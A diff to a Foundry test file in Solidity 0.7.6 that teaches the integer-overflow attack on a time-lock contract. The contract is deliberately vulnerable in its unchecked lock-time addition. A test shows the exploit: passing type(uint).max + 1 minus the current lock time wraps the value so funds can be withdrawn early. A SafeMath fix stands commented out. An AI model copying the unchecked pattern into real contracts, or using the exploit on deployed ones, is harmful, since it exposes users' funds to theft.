@@ -2,7 +2,10 @@
 pragma solidity ^0.7.6;
 
 import "forge-std/Test.sol";
+import "./SafeMath.sol";
 
+
+// https://solidity-by-example.org/hacks/overflow/
 
 // This contract is designed to act as a time vault.
 // User can deposit into this contract but cannot withdraw for atleast a week.
@@ -22,6 +25,8 @@ and was able to withdraw before the 1 week waiting period.
 */
 
 contract TimeLock {
+    // using SafeMath for uint256;
+
     mapping(address => uint) public balances;
     mapping(address => uint) public lockTime;
 
@@ -32,6 +37,7 @@ contract TimeLock {
 
     function increaseLockTime(uint _secondsToIncrease) public {
         lockTime[msg.sender] += _secondsToIncrease; // vulnerable
+        // lockTime[msg.sender] = lockTime[msg.sender].add(_secondsToIncrease); 
     }
 
     function withdraw() public {
@@ -47,40 +53,50 @@ contract TimeLock {
 }
 
 contract ContractTest is Test {
-    TimeLock TimeLockContract;
-    address alice;
+    TimeLock public TimeLockContract;
+    address alice; // EOA account
     address bob;
-
     function setUp() public {
         TimeLockContract = new TimeLock();
-        alice = vm.addr(1);
-        bob = vm.addr(2);
+        // alice = vm.addr(1);
+        alice = makeAddr("alice");
+        // bob = vm.addr(2);
+        bob = makeAddr("bob");
         vm.deal(alice, 1 ether);   
         vm.deal(bob, 1 ether);
     }    
            
     function testFailOverflow() public {
-        console.log("Alice balance", alice.balance);
-        console.log("Bob balance", bob.balance);
+        // console.log("Alice balance", alice.balance);
+        emit log_named_decimal_uint("Alice balance", alice.balance, 18);
+        // console.log("Bob balance", bob.balance);
+        emit log_named_decimal_uint("Bob balance", bob.balance, 18);
 
         console.log("Alice deposit 1 Ether...");
         vm.prank(alice);
         TimeLockContract.deposit{value: 1 ether}();
-        console.log("Alice balance", alice.balance);
+        emit log_named_decimal_uint("Alice balance", alice.balance, 18);
+        // console.log("Alice balance", alice.balance);
 
         console.log("Bob deposit 1 Ether...");
         vm.startPrank(bob); 
         TimeLockContract.deposit{value: 1 ether}();
-        console.log("Bob balance", alice.balance);
+        emit log_named_decimal_uint("Bob balance", bob.balance, 18);
+        // console.log("Bob balance", bob.balance);
 
         // exploit here
+        // bob locktime = t
+        // overflow == type(uint).max + 1 
+        // t + x = type(uint).max + 1 
+        // x = type(uint).max + 1 - t
         TimeLockContract.increaseLockTime(
             type(uint).max + 1 - TimeLockContract.lockTime(bob)
         );
 
         console.log("Bob will successfully to withdraw, because the lock time is overflowed");
         TimeLockContract.withdraw();
-        console.log("Bob balance", bob.balance);
+        // console.log("Bob balance", bob.balance);
+        emit log_named_decimal_uint("Bob balance", bob.balance, 18);
         vm.stopPrank();
 
         vm.prank(alice);
